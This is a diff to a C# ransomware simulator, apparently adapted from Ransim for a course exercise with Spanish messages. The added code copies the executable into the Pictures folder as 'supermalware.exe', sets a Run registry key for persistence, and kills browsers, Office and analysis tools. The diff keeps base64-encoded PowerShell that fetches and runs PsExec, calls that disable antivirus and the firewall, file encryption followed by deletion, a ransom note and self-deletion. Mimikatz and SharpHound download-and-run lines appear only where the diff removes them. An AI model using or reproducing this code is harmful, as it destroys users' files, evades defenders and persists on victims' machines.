@@ -90,34 +90,12 @@ namespace Activitat2
 
         static void ManipulateRegistry()
         {
-            /* Common registry changes performed by ransomware */
 
-            // Enable Long Paths to avoid issues that may occur when encrypting files with long path names
-            Process.Start("cmd.exe", @"/c REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f");
+            string destPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "supermalware.exe";
+
+
+            Process.Start("cmd.exe", @"/c ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /V Malware-VIU /t REG_SZ /F /D " + destPath);
             System.Threading.Thread.Sleep(500);
-
-            // Revert the change
-            Process.Start("cmd.exe", @"/c REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 0 /f");
-
-            // Disable UAC remote restrictions
-            // See: 
-            //       1. https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction
-            //       2. https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167
-            Process.Start("cmd.exe", @"/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
-            System.Threading.Thread.Sleep(500);
-
-            // Revert the change
-            Process.Start("cmd.exe", @"/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 0 /f");
-
-            // Disable EnableLinkedConnections to force the symbolic links to be written to both linked logon sessions
-            // This is useful because when drive mappings are created, the system creates symbolic link objects (DosDevices) that associate the drive letters to the UNC paths 
-            // These objects are specific for a logon session and are not shared between logon sessions
-            Process.Start("cmd.exe", @"/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System / v EnableLinkedConnections / t REG_DWORD / d 1 / f");
-            System.Threading.Thread.Sleep(500);
-
-            // Revert the change
-            Process.Start("cmd.exe", @"/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System / v EnableLinkedConnections / t REG_DWORD / d 0 / f");
-
         }
 
         static void StopServices()
@@ -153,13 +131,6 @@ namespace Activitat2
             // Fetch and run PsExec
             /* $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -URI https://live.sysinternals.com/PsExec64.exe -Out $env:temp\psexec.exe; Start-Process $env:temp\psexec.exe -ArgumentList "-r SysUpdate ipconfig" -NoNewWindow -Wait; del $env:temp\psexec.exe */
             Process.Start("powershell.exe", "-nop - win hid - exec bypass - encodedcommand JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBsAGkAdgBlAC4AcwB5AHMAaQBuAHQAZQByAG4AYQBsAHMALgBjAG8AbQAvAFAAcwBFAHgAZQBjADYANAAuAGUAeABlACAALQBPAHUAdAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAcABzAGUAeABlAGMALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZQBuAHYAOgB0AGUAbQBwAFwAcABzAGUAeABlAGMALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0AcgAgAFMAeQBzAFUAcABkAGEAdABlACAAaQBwAGMAbwBuAGYAaQBnACIAIAAtAE4AbwBOAGUAdwBXAGkAbgBkAG8AdwAgAC0AVwBhAGkAdAA7ACAAZABlAGwAIAAkAGUAbgB2ADoAdABlAG0AcABcAHAAcwBlAHgAZQBjAC4AZQB4AGUADQAKAA==");
-        }
-
-        static void RunMimikatz()
-        {
-            // Fetch and run Mimikatz
-            /* Runs $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -URI https://github.com/d4rk-d4nph3/Ransim/raw/v0.2/Tools/Mimikatz.exe -Out $env:temp\mimikatz.exe; Start-Process $env:temp\mimikatz.exe -ArgumentList '"privilege::debug" "sekurlsa::logonpasswords" "exit"' -NoNewWindow -Wait; del $env:temp\mimikatz.exe */
-            Process.Start("powershell.exe", "-nop - win hid - exec bypass - encodedcommand JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZAA0AHIAawAtAGQANABuAHAAaAAzAC8AUgBhAG4AcwBpAG0ALwByAGEAdwAvAHYAMAAuADIALwBUAG8AbwBsAHMALwBNAGkAbQBpAGsAYQB0AHoALgBlAHgAZQAgAC0ATwB1AHQAIAAkAGUAbgB2ADoAdABlAG0AcABcAG0AaQBtAGkAawBhAHQAegAuAGUAeABlADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABlAG4AdgA6AHQAZQBtAHAAXABtAGkAbQBpAGsAYQB0AHoALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAnACIAcAByAGkAdgBpAGwAZQBnAGUAOgA6AGQAZQBiAHUAZwAiACAAIgBzAGUAawB1AHIAbABzAGEAOgA6AGwAbwBnAG8AbgBwAGEAcwBzAHcAbwByAGQAcwAiACAAIgBlAHgAaQB0ACIAJwAgAC0ATgBvAE4AZQB3AFcAaQBuAGQAbwB3ACAALQBXAGEAaQB0ADsAIABkAGUAbAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAbQBpAG0AaQBrAGEAdAB6AC4AZQB4AGUADQAKAA==");
         }
 
         static void DisableFirewall()
@@ -205,19 +176,43 @@ namespace Activitat2
 
             // Query VMs on the system
             Process.Start("powershell.exe", "-command Get-VM");
-
-            // AD Domain recon
-            Process.Start("nltest.exe", "/domain_trusts");
-            Process.Start("nltest.exe", "/domain_trusts /all_trusts");
-            Process.Start("net.exe", "group 'Domain Admins' /domain");
         }
 
-        static void ExecuteSharpHound()
+        static void KillProcess() 
         {
-            // Fetches and runs SharpHound (the official data collector for BloodHound)
-            /* Runs $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -URI https://github.com/d4rk-d4nph3/Ransim/raw/v0.2/Tools/SharpHound.exe -Out $env:temp\sharphound.exe; Start-Process $env:temp\sharphound.exe -ArgumentList "--collectionmethods DConly --outputdirectory $env:temp --zipfilename JSONResult.zip" -NoNewWindow -Wait; del $env:temp\sharphound.exe -Force; del $env:temp\*_JSONResult.zip */
-            Process.Start("powershell.exe", "-nop -win hid -exec bypass -encodedcommand JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZAA0AHIAawAtAGQANABuAHAAaAAzAC8AUgBhAG4AcwBpAG0ALwByAGEAdwAvAHYAMAAuADIALwBUAG8AbwBsAHMALwBTAGgAYQByAHAASABvAHUAbgBkAC4AZQB4AGUAIAAtAE8AdQB0ACAAJABlAG4AdgA6AHQAZQBtAHAAXABzAGgAYQByAHAAaABvAHUAbgBkAC4AZQB4AGUAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAGUAbgB2ADoAdABlAG0AcABcAHMAaABhAHIAcABoAG8AdQBuAGQALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0ALQBjAG8AbABsAGUAYwB0AGkAbwBuAG0AZQB0AGgAbwBkAHMAIABEAEMAbwBuAGwAeQAgAC0ALQBvAHUAdABwAHUAdABkAGkAcgBlAGMAdABvAHIAeQAgACQAZQBuAHYAOgB0AGUAbQBwACAALQAtAHoAaQBwAGYAaQBsAGUAbgBhAG0AZQAgAEoAUwBPAE4AUgBlAHMAdQBsAHQALgB6AGkAcAAiACAALQBOAG8ATgBlAHcAVwBpAG4AZABvAHcAIAAtAFcAYQBpAHQAOwAgAGQAZQBsACAAJABlAG4AdgA6AHQAZQBtAHAAXABzAGgAYQByAHAAaABvAHUAbgBkAC4AZQB4AGUAIAAtAEYAbwByAGMAZQA7ACAAZABlAGwAIAAkAGUAbgB2ADoAdABlAG0AcABcAEoAUwBPAE4AUgBlAHMAdQBsAHQALgB6AGkAcAA=");
 
+            foreach (var process in Process.GetProcesses())
+            {
+                switch(process.ProcessName)
+                {
+                    case "firefox":
+                        process.Kill();
+                        break;
+                    case "winword":
+                        process.Kill();
+                        break;
+                    case "wordpad":
+                        process.Kill();
+                        break;
+                    case "processhacker":
+                        process.Kill();
+                        break;
+                    case "procexp":
+                        process.Kill();
+                        break;
+                    case "pestudio":
+                        process.Kill();
+                        break;
+                    case "notepad":
+                        process.Kill();
+                        break;
+                    case "outlook":
+                        process.Kill();
+                        break;
+                    default:
+                        break;
+                }
+            }
         }
 
         static void RansomNoteDownload(string ransomNote)
@@ -248,6 +243,14 @@ namespace Activitat2
             Console.WriteLine(responseJSON);
         }
 
+        static void CopyToTemp()
+        {
+            string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            string destPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "supermalware.exe";
+
+            System.IO.File.Copy(exePath, destPath, true);
+        }
+
         static void SelfDelete()
         {
             // Delete itself
@@ -257,7 +260,7 @@ namespace Activitat2
 
         static void Main(string[] args)
         {
-            const string targetDir = "Desktop\Documentos";
+            const string targetDir = "Desktop\\Documentos";
             const string ransomNote = "ransom_note.txt";
             const string tempDir = "VIU";
             const string randomPassword = "VIU2022";
@@ -267,59 +270,43 @@ namespace Activitat2
 
             string tempDirPath = userDirPath + @"\" + tempDir;
 
-            // Check if Ransim was ran as Admin
             if (IsAdministrator() == true)
             {
-                Console.WriteLine("Please run Ransim as administrator!");
-                Console.WriteLine("Exiting...");
+                Console.WriteLine("Lanza el ejecutable como administrador!");
+                Console.WriteLine("Saliendo...");
                 return;
             }
 
             if (!Directory.Exists(targetDirPath))
             {
-                // Precaution
-                Console.WriteLine("Reports directory does not exist in USERPROFILE!!");
-                Console.WriteLine("Exiting...");
+                Console.WriteLine("Crea la carpeta documentos en el escritorio para poder lanzar la muestra correctamente!!");
+                Console.WriteLine("Saliendo...");
                 return;
             }
 
-            //Run Location Check
             LocationCheck();
+
+            CopyToTemp();
 
             RunRecon();
             DisableAV();
             DisableFirewall();
-
-            RunMimikatz();
-
-            RunPsExec();
-
-            ExecuteSharpHound();
-
-            // Make sure you have correctly configured Rclone before you enable this function
-            //ExfilData();
+            KillProcess();
 
             ManipulateRegistry();
             StopServices();
 
-            Console.WriteLine("Starting encryption process");
-            // Iterate over files in the target directory for encryption.
+            Console.WriteLine("Empieza el cifrado");
+
             foreach (string file in files)
             {
                 FileEncrypt(file, randomPassword);
                 File.Delete(file);
             }
-
-            Console.WriteLine("Downloading ransom note from pastebin.");
-            // Download ransom note from Pastebin.
             RansomNoteDownload(ransomNote);
 
-            // Open notepad to display the ransom note.
             Process.Start("notepad.exe", ransomNote);
 
-            Console.WriteLine("Time for you to check your logs.");
-
-            // Initiate Self Delete Procedure
             SelfDelete();
         }
     }
